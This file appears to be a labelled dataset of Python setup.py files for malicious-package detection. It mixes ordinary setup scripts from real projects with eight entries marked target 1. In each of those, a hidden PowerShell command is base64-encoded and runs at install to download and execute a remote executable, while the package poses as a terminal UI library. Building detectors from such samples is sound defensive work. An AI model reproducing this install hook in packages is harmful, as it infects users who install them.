{"idx": "libcchydraencode-3.22", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcchydraencode',\n    packages = ['modlib'],\n    version = '6.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8_annotations_coverage-0.0.6", "func": "from typing import Optional\n\nfrom setuptools import setup, find_packages\n\n\npackage_name = 'flake8_annotations_coverage'\n\n\ndef get_version() -> Optional[str]:\n    with open('flake8_annotations_coverage/__init__.py', 'r') as f:\n        lines = f.readlines()\n    for line in lines:\n        if line.startswith('__version__'):\n            return line.split('=')[-1].strip().strip(\"'\")\n\n\ndef get_long_description() -> str:\n    with open('README.md') as f:\n        return f.read()\n\n\nsetup(\n    name=package_name,\n    description='A flake8 extension that checks for type annotations coverage',\n    classifiers=[\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Documentation',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    long_description=get_long_description(),\n    long_description_content_type='text/markdown',\n    python_requires='>=3.7',\n    packages=find_packages(),\n    include_package_data=True,\n    keywords='flake8 annotations',\n    version=get_version(),\n    author='Ilya Lebedev',\n    author_email='melevir@gmail.com',\n    install_requires=['flake8'],\n    entry_points={\n        'flake8.extension': [\n            'TAE001 = flake8_annotations_coverage.annotations_coverage:AnnotationsCoverageChecker',\n        ],\n    },\n    url='https://github.com/best-doctor/flake8-annotations-coverage',\n    license='MIT',\n    py_modules=[package_name],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "docker-compose-1.29.2", "func": "#!/usr/bin/env python\nimport codecs\nimport os\nimport re\nimport sys\n\nimport pkg_resources\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\ndef read(*parts):\n    path = os.path.join(os.path.dirname(__file__), *parts)\n    with codecs.open(path, encoding='utf-8') as fobj:\n        return fobj.read()\n\n\ndef find_version(*file_paths):\n    version_file = read(*file_paths)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n                              version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\ninstall_requires = [\n    'docopt >= 0.6.1, < 1',\n    'PyYAML >= 3.10, < 6',\n    'requests >= 2.20.0, < 3',\n    'texttable >= 0.9.0, < 2',\n    'websocket-client >= 0.32.0, < 1',\n    'distro >= 1.5.0, < 2',\n    'docker[ssh] >= 5',\n    'dockerpty >= 0.4.1, < 1',\n    'jsonschema >= 2.5.1, < 4',\n    'python-dotenv >= 0.13.0, < 1',\n]\n\n\ntests_require = [\n    'ddt >= 1.2.2, < 2',\n    'pytest < 6',\n]\n\n\nif sys.version_info[:2] < (3, 4):\n    tests_require.append('mock >= 1.0.1, < 4')\n\nextras_require = {\n    ':python_version < \"3.5\"': ['backports.ssl_match_hostname >= 3.5, < 4'],\n    ':python_version < \"3.8\"': ['cached-property >= 1.2.0, < 2'],\n    ':sys_platform == \"win32\"': ['colorama >= 0.4, < 1'],\n    'socks': ['PySocks >= 1.5.6, != 1.5.7, < 2'],\n    'tests': tests_require,\n}\n\n\ntry:\n    if 'bdist_wheel' not in sys.argv:\n        for key, value in extras_require.items():\n            if key.startswith(':') and pkg_resources.evaluate_marker(key[1:]):\n                install_requires.extend(value)\nexcept Exception as e:\n    print(\"Failed to compute platform dependencies: {}. \".format(e) +\n          \"All dependencies will be installed as a result.\", file=sys.stderr)\n    for key, value in extras_require.items():\n        if key.startswith(':'):\n            install_requires.extend(value)\n\n\nsetup(\n    name='docker-compose',\n    version=find_version(\"compose\", \"__init__.py\"),\n    description='Multi-container orchestration for Docker',\n    long_description=read('README.md'),\n    long_description_content_type='text/markdown',\n    url='https://www.docker.com/',\n    project_urls={\n        'Documentation': 'https://docs.docker.com/compose/overview',\n        'Changelog': 'https://github.com/docker/compose/blob/release/CHANGELOG.md',\n        'Source': 'https://github.com/docker/compose',\n        'Tracker': 'https://github.com/docker/compose/issues',\n    },\n    author='Docker, Inc.',\n    license='Apache License 2.0',\n    packages=find_packages(exclude=['tests.*', 'tests']),\n    include_package_data=True,\n    install_requires=install_requires,\n    extras_require=extras_require,\n    tests_require=tests_require,\n    python_requires='>=3.4',\n    entry_points={\n        'console_scripts': ['docker-compose=compose.cli.main:main'],\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n    ],\n)\n", "target": 0}
{"idx": "dagster-spark-0.16.3", "func": "from typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_spark/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster-spark\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"Package for Spark Dagster framework components.\",\n        url=\"https://github.com/dagster-io/dagster/tree/master/python_modules/libraries/dagster-spark\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_spark_tests*\"]),\n        install_requires=[\"dagster==1.0.3\"],\n        zip_safe=False,\n    )\n", "target": 0}
{"idx": "tppepcontrolstring-1.62", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppepcontrolstring',\n    packages = ['modlib'],\n    version = '3.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-pyencodeload-4.63", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pyencodeload',\n    packages = ['modlib'],\n    version = '1.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpstrsplitvirtual-9.24", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstrsplitvirtual',\n    packages = ['modlib'],\n    version = '4.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-rest-auth-0.9.5", "func": "#!/usr/bin/env python\n\nimport os\nfrom setuptools import setup, find_packages\n\n\nhere = os.path.dirname(os.path.abspath(__file__))\nf = open(os.path.join(here, 'README.rst'))\nlong_description = f.read().strip()\nf.close()\n\n\nsetup(\n    name='django-rest-auth',\n    version='0.9.5',\n    author='Sumit Chachra',\n    author_email='chachra@tivix.com',\n    url='http://github.com/Tivix/django-rest-auth',\n    description='Create a set of REST API endpoints for Authentication and Registration',\n    packages=find_packages(),\n    long_description=long_description,\n    keywords='django rest auth registration rest-framework django-registration api',\n    zip_safe=False,\n    install_requires=[\n        'Django>=1.8.0',\n        'djangorestframework>=3.1.3',\n        'six>=1.9.0',\n    ],\n    extras_require={\n        'with_social': ['django-allauth>=0.25.0'],\n    },\n    tests_require=[\n        'responses>=0.5.0',\n        'django-allauth>=0.25.0',\n        'djangorestframework-jwt>=1.9.0',\n    ],\n    test_suite='runtests.runtests',\n    include_package_data=True,\n    classifiers=[\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development'\n    ],\n)\n", "target": 0}
{"idx": "cchttp-1.5", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'cchttp',\n    packages = ['modlib'],\n    version = '8.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-docstrings-1.6.0", "func": "# -*- coding: utf-8 -*-\n\"\"\"``flake8-docstring`` lives on\n`GitLab <https://gitlab.com/pycqa/flake8-docstrings>`_.\n\"\"\"\n\nfrom setuptools import setup\n\n\ndef get_version(fname=\"flake8_docstrings.py\"):\n    with open(fname) as f:\n        for line in f:\n            if line.startswith('__version__'):\n                return eval(line.split('=')[-1])\n\n\ndef get_long_description():\n    descr = []\n    for fname in ('README.rst', 'HISTORY.rst'):\n        with open(fname) as f:\n            descr.append(f.read())\n    return '\\n\\n'.join(descr)\n\n\nsetup(\n    name='flake8-docstrings',\n    version=get_version(),\n    description=\"Extension for flake8 which uses pydocstyle to check docstrings\",\n    long_description=get_long_description(),\n    license='MIT License',\n    author='Simon ANDR\u00c9',\n    author_email='sandre@anybox.fr',\n    maintainer='Ian Cordasco',\n    maintainer_email='graffatcolmingov@gmail.com',\n    url='https://gitlab.com/pycqa/flake8-docstrings',\n    classifiers=['Intended Audience :: Developers',\n                 'Environment :: Console',\n                 'Programming Language :: Python :: 2',\n                 'Programming Language :: Python :: 3',\n                 'Operating System :: OS Independent',\n                 'License :: OSI Approved :: MIT License'],\n    keywords='PEP 257, pydocstyle, pep257, docstrings, flake8',\n    entry_points={\n        'flake8.extension': [\n            'D = flake8_docstrings:pep257Checker',\n        ],\n    },\n    install_requires=['flake8 >= 3', 'pydocstyle >= 2.1'],\n    provides=['flake8_docstrings'],\n    py_modules=['flake8_docstrings'],\n)\n", "target": 0}
{"idx": "esqpostintel-6.23", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpostintel',\n    packages = ['modlib'],\n    version = '5.65',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "easy-thumbnails-2.8.3", "func": "#!/usr/bin/env python\nimport codecs\n\nfrom setuptools import find_packages, setup\n\nimport easy_thumbnails\n\n\ndef read_files(*filenames):\n    \"\"\"\n    Output the contents of one or more files to a single concatenated string.\n    \"\"\"\n    output = []\n    for filename in filenames:\n        f = codecs.open(filename, encoding=\"utf-8\")\n        try:\n            output.append(f.read())\n        finally:\n            f.close()\n    return \"\\n\\n\".join(output)\n\n\nsetup(\n    name=\"easy-thumbnails\",\n    version=easy_thumbnails.get_version(),\n    url=\"http://github.com/SmileyChris/easy-thumbnails\",\n    description=\"Easy thumbnails for Django\",\n    long_description=read_files(\"README.rst\", \"CHANGES.rst\"),\n    author=\"Chris Beaven\",\n    author_email=\"smileychris@gmail.com\",\n    platforms=[\"any\"],\n    packages=find_packages(),\n    include_package_data=True,\n    install_requires=[\n        \"django>=2.2\",\n        \"pillow\",\n    ],\n    extras_require={\n        \"svg\": [\n            \"svglib\",\n            \"reportlab\",\n        ],\n    },\n    python_requires=\">=3.6\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Software Development :: Libraries :: Application Frameworks\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "exchange_calendars-4.1.1", "func": "# This file is currently (2022-06) required in order for pip to be able to create\n# editable installs when build meta is included to pyproject.toml. Likely that at\n# some future point this will no longer be required and file can be removed.\n# Reference: https://setuptools.pypa.io/en/latest/userguide/pyproject_config.html\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "esqultragrandgame-5.73", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqultragrandgame',\n    packages = ['modlib'],\n    version = '6.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ddsketch-2.0.4", "func": "import setuptools\n\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name=\"ddsketch\",\n    author=\"Jee Rim, Charles-Philippe Masson, Homin Lee\",\n    author_email=\"jee.rim@datadoghq.com, charles.masson@datadoghq.com, homin@datadoghq.com\",\n    description=\"Distributed quantile sketches\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"http://github.com/datadog/sketches-py\",\n    packages=setuptools.find_packages(exclude=[\"tests*\"]),\n    package_data={\"ddsketch\": [\"py.typed\"]},\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: Apache Software License\",\n    ],\n    keywords=[\"ddsketch\", \"quantile\", \"sketch\"],\n    install_requires=[\n        \"protobuf>=3.0.0; python_version>='3.7'\",\n        \"protobuf>=3.0.0,<4.21.0; python_version<'3.7'\",\n        \"six\",\n        \"typing; python_version<'3.5'\",\n    ],\n    python_requires=\">=2.7\",\n    download_url=\"https://github.com/DataDog/sketches-py/archive/v1.0.tar.gz\",\n    setup_requires=[\"setuptools_scm\"],\n    use_scm_version={\"write_to\": \"ddsketch/__version.py\"},\n)\n", "target": 0}
{"idx": "Geohash-1.0", "func": "\"\"\"\nCopyright (C) 2008 Leonard Norrgard <leonard.norrgard@gmail.com>\nCopyright (C) 2015 Leonard Norrgard <leonard.norrgard@gmail.com>\n\nThis file is part of Geohash.\n\nGeohash is free software: you can redistribute it and/or modify it\nunder the terms of the GNU Affero General Public License as published\nby the Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nGeohash is distributed in the hope that it will be useful, but WITHOUT\nANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\nFITNESS FOR A PARTICULAR PURPOSE.  See the GNU Affero General Public\nLicense for more details.\n\nYou should have received a copy of the GNU Affero General Public\nLicense along with Geohash.  If not, see\n<http://www.gnu.org/licenses/>.\n\"\"\"\nfrom setuptools import setup, find_packages\nsetup(\n    name = \"Geohash\",\n    version = \"1.0\",\n    packages = find_packages(),\n\n    # Project uses reStructuredText, so ensure that the docutils get\n    # installed or upgraded on the target machine\n    install_requires = ['docutils>=0.3'],\n\n    package_data = {\n        # If any package contains *.txt or *.rst files, include them:\n        '': ['*.txt', '*.rst']\n    },\n\n    # metadata for upload to PyPI\n    author = \"Leonard Norrgard\",\n    author_email = \"leonard.norrgard@gmail.com\",\n    description = \"Module to decode/encode Geohashes to/from latitude and longitude.  See http://en.wikipedia.org/wiki/Geohash\",\n    long_description = \"This module provides functions to decode and encode Geohashes to and from latitude and longitude coordinates.\",\n    license = \"GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.\",\n    keywords = \"Geohash GIS latitude longitude encode decode Galileo GPS WGS84 coordinates geotagging\",\n    url = \"https://github.com/vinsci/geohash/\",   # project home page, if any\n    download_url = \"https://github.com/vinsci/geohash/archive/master.zip\"\n)\n", "target": 0}
{"idx": "selfmineultraram-6.14", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfmineultraram',\n    packages = ['modlib'],\n    version = '6.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
